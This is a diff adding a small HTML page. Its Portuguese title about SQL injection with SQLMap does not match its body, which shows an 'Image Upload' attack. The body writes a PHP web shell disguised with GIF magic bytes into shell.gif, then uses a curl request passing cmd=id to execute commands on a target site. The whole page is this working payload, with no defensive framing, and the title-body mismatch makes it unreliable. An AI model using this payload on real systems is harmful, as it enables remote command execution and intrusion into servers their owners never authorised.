@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Técnicas Avançadas: Identificando Vulnerabilidades de Injeção SQL em Sites através do SQLMap</title>
+<link rel="stylesheet" href="css/style.css">
+
+</head>
+<body>
+
+<div class="container">
+    <h1>Image Upload:</h1>
+   
+    <pre>
+# GIF8 is for magic bytes
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+
+curl --user-agent "PENTEST" "$URL/?parameter=/path/to/image/shell.gif&cmd=id"
+</pre>
+
+   
+</div>
+
+</body>
+</html>
+
